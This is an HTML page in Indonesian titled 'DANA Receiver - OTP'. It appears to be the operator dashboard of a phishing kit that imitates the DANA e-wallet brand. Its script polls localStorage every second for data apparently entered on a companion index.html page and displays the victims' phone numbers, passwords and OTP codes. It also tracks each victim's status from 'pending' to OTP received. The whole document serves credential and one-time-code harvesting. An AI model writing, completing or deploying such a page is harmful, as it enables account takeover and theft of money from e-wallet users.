<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA Receiver - OTP</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Inter', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card-receiver {
            background: #1a1a2e;
            border: 1px solid #2a2a4e;
            border-radius: 28px;
            padding: 32px 24px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            animation: fadeUp 0.5s ease;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo-dana {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo-dana .icon-wrapper {
            display: inline-block;
            background: linear-gradient(135deg, #0080ff, #0055cc);
            width: 60px;
            height: 60px;
            border-radius: 16px;
            line-height: 60px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0, 128, 255, 0.2);
            margin-bottom: 10px;
        }
        .logo-dana .icon-wrapper i { font-size: 32px; color: #fff; }
        .logo-dana .brand {
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -1px;
            color: #fff;
        }
        .logo-dana .brand .d { color: #0080ff; }
        .logo-dana .brand .a { color: #0080ff; }
        .logo-dana .brand .n { color: #0080ff; }
        .logo-dana .brand .a2 { color: #0080ff; }
        .logo-dana .sub {
            color: #6a6a8a;
            font-size: 12px;
            letter-spacing: 2px;
        }
        .badge-live {
            display: inline-block;
            background: #00aa44;
            color: #fff;
            font-size: 11px;
            font-weight: 600;
            padding: 2px 14px;
            border-radius: 60px;
            margin-top: 4px;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        .data-box {
            background: #0a0a1a;
            border: 2px solid #2a2a4e;
            border-radius: 16px;
            padding: 16px;
            margin-top: 12px;
            transition: 0.3s;
        }
        .data-box .label {
            color: #6a6a8a;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .data-box .value {
            color: #00ff44;
            font-family: monospace;
            font-size: 18px;
            font-weight: 700;
            word-break: break-all;
            margin: 4px 0;
        }
        .data-box .value.password {
            color: #ffcc00;
        }
        .data-box .value.otp {
            color: #00ff44;
            font-size: 28px;
            letter-spacing: 4px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #1a1a2e;
            color: #c0c0e0;
            font-size: 14px;
        }
        .info-row:last-child { border-bottom: none; }
        .info-row .label { color: #6a6a8a; }
        .info-row .value { color: #fff; font-weight: 500; }

        .btn-refresh {
            background: transparent;
            border: 2px solid #2a2a4e;
            border-radius: 60px;
            padding: 10px;
            color: #8a8aaa;
            width: 100%;
            transition: 0.3s;
            font-size: 14px;
            font-weight: 500;
            margin-top: 12px;
        }
        .btn-refresh:hover {
            border-color: #0080ff;
            color: #0080ff;
        }

        .btn-dana {
            background: linear-gradient(135deg, #0080ff, #0055cc);
            border: none;
            border-radius: 60px;
            padding: 12px;
            font-weight: 700;
            font-size: 14px;
            color: #fff;
            width: 100%;
            transition: 0.3s;
            box-shadow: 0 4px 20px rgba(0, 128, 255, 0.3);
            font-family: 'Inter', sans-serif;
            margin-top: 8px;
        }
        .btn-dana:hover { transform: scale(1.02); }
        .btn-dana:active { transform: scale(0.96); }

        .footer-text {
            text-align: center;
            color: #4a4a6a;
            font-size: 12px;
            margin-top: 20px;
            border-top: 1px solid #1a1a2e;
            padding-top: 16px;
        }
        .footer-text .brand-small { color: #0080ff; font-weight: 700; }

        .empty-state {
            text-align: center;
            color: #4a4a6a;
            padding: 20px 0;
        }
        .empty-state i { font-size: 40px; color: #2a2a4e; margin-bottom: 8px; }
        .empty-state h5 { color: #8a8aaa; font-weight: 500; }

        .status-badge {
            display: inline-block;
            padding: 2px 14px;
            border-radius: 60px;
            font-size: 12px;
            font-weight: 600;
        }
        .status-badge.pending { background: #ff8800; color: #000; }
        .status-badge.otp_sent { background: #0080ff; color: #fff; }
        .status-badge.verified { background: #00aa44; color: #fff; }

        .toast-container {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 9999;
            background: #1a1a2e;
            color: #fff;
            padding: 12px 24px;
            border-radius: 60px;
            font-size: 14px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            display: none;
            font-family: 'Inter', sans-serif;
        }

        .last-update {
            color: #4a4a6a;
            font-size: 11px;
            text-align: center;
            margin-top: 8px;
        }
    </style>
</head>
<body>

<div class="card-receiver">

    <!-- LOGO -->
    <div class="logo-dana">
        <div class="icon-wrapper"><i class="bi bi-wallet2"></i></div>
        <div class="brand"><span class="d">D</span><span class="a">A</span><span class="n">N</span><span class="a2">A</span></div>
        <div class="sub">Receiver OTP System</div>
        <div class="badge-live"><i class="bi bi-dot"></i> Live</div>
    </div>

    <!-- ===== DATA MASUK ===== -->
    <div id="dataContent">
        <div class="empty-state">
            <i class="bi bi-inbox"></i>
            <h5>Menunggu Data...</h5>
            <p style="font-size:13px;color:#4a4a6a;">Tunggu user mengirim data dari halaman utama</p>
            <p style="font-size:12px;color:#2a2a4e;margin-top:8px;">
                <i class="bi bi-arrow-repeat"></i> Auto refresh setiap 1 detik
            </p>
        </div>
    </div>

    <button class="btn-dana" onclick="loadData()" style="margin-top:12px;">
        <i class="bi bi-arrow-repeat"></i> Refresh Manual
    </button>

    <div class="last-update" id="lastUpdate">Terakhir update: -</div>

    <div class="footer-text">
        &copy; 2026 <span class="brand-small">DANA</span> — OTP Receiver
    </div>
</div>

<!-- ===== TOAST ===== -->
<div class="toast-container" id="toast">✅ Data diperbarui</div>

<script>
    // ============================================================
    // RECEIVER.HTML — FIXED, PASTI JALAN
    // ============================================================

    let lastData = '';

    function loadData() {
        const container = document.getElementById('dataContent');

        // === BACA DATA DARI LOCALSTORAGE ===
        const userDataRaw = localStorage.getItem('dana_user_data');
        const otpDataRaw = localStorage.getItem('dana_otp_data');

        let userData = null;
        let otpData = null;

        try {
            if (userDataRaw) userData = JSON.parse(userDataRaw);
            if (otpDataRaw) otpData = JSON.parse(otpDataRaw);
        } catch(e) {
            console.error('Parse error:', e);
        }

        // === UPDATE LAST UPDATE ===
        document.getElementById('lastUpdate').textContent = 'Terakhir update: ' + new Date().toLocaleTimeString('id-ID');

        // === CEK APAKAH ADA PERUBAHAN ===
        const currentData = JSON.stringify({ user: userData, otp: otpData });
        if (currentData === lastData) return; // Gak ada perubahan
        lastData = currentData;

        // === KALO BELUM ADA DATA ===
        if (!userData && !otpData) {
            container.innerHTML = `
                <div class="empty-state">
                    <i class="bi bi-inbox"></i>
                    <h5>Belum ada data masuk</h5>
                    <p style="font-size:13px;color:#4a4a6a;">Tunggu user mengirim dari halaman utama</p>
                    <p style="font-size:12px;color:#2a2a4e;margin-top:8px;">
                        <i class="bi bi-info-circle"></i> Pastikan index.html sudah diklik Verifikasi
                    </p>
                </div>
            `;
            return;
        }

        // === BUILD HTML ===
        let html = '';

        // --- USER DATA ---
        if (userData) {
            const statusClass = userData.status === 'pending' ? 'pending' :
                               userData.status === 'otp_sent' ? 'otp_sent' : 'verified';
            const statusLabel = userData.status === 'pending' ? 'Menunggu OTP' :
                               userData.status === 'otp_sent' ? 'OTP Terkirim' : 'Selesai';

            html += `
                <div class="data-box">
                    <div class="label"><i class="bi bi-person"></i> DATA USER</div>
                    <div class="value">📱 ${userData.phone || '-'}</div>
                    <div class="value password">🔒 ${userData.password || '-'}</div>
                    <div style="margin-top:6px;">
                        <span class="status-badge ${statusClass}">${statusLabel}</span>
                        <span style="color:#4a4a6a;font-size:11px;margin-left:8px;">${new Date(userData.timestamp).toLocaleTimeString('id-ID')}</span>
                    </div>
                </div>
            `;
        }

        // --- OTP DATA ---
        if (otpData) {
            html += `
                <div class="data-box" style="border-color:#0080ff;">
                    <div class="label"><i class="bi bi-shield-check"></i> KODE OTP</div>
                    <div class="value otp">${otpData.otp || '------'}</div>
                    <div style="font-size:13px;color:#6a6a8a;margin-top:4px;">
                        📱 ${otpData.phone || '-'}
                        <span style="margin-left:12px;color:#4a4a6a;">${new Date(otpData.timestamp).toLocaleTimeString('id-ID')}</span>
                    </div>
                </div>
            `;
        }

        // --- STATUS RINGKASAN ---
        const hasOtp = otpData && otpData.otp;
        html += `
            <div style="margin-top:12px;padding:10px 14px;background:#0a0a1a;border-radius:12px;border:1px solid #1a1a2e;">
                <div class="info-row">
                    <span class="label">Status</span>
                    <span class="value" style="color:${hasOtp ? '#00ff44' : '#ff8800'};">${hasOtp ? 'OTP Diterima ✅' : 'Menunggu OTP...'}</span>
                </div>
                <div class="info-row">
                    <span class="label">Data User</span>
                    <span class="value" style="color:${userData ? '#00ff44' : '#ff4400'};">${userData ? 'Ada ✅' : '❌'}</span>
                </div>
                <div class="info-row">
                    <span class="label">Total Data</span>
                    <span class="value">${(userData ? 1 : 0) + (otpData ? 1 : 0)} item</span>
                </div>
            </div>
        `;

        container.innerHTML = html;

        // === TOAST ===
        showToast('📩 Data berhasil dimuat!');
    }

    // ===== TOAST =====
    function showToast(message) {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.style.display = 'block';
        setTimeout(() => {
            toast.style.display = 'none';
        }, 3000);
    }

    // ===== AUTO LOAD =====
    loadData();

    // Auto refresh setiap 1 detik (biar cepet)
    setInterval(loadData, 1000);

    // ===== LISTENER LOCALSTORAGE (cross-tab) =====
    window.addEventListener('storage', function(e) {
        if (e.key === 'dana_user_data' || e.key === 'dana_otp_data') {
            loadData();
            showToast('📩 Data baru masuk!');
        }
    });

    // ===== CEK KONEKSI (debug) =====
    console.log('🔍 Receiver aktif, menunggu data dari localStorage');
    console.log('📦 dana_user_data:', localStorage.getItem('dana_user_data'));
    console.log('📦 dana_otp_data:', localStorage.getItem('dana_otp_data'));
</script>

</body>
</html>
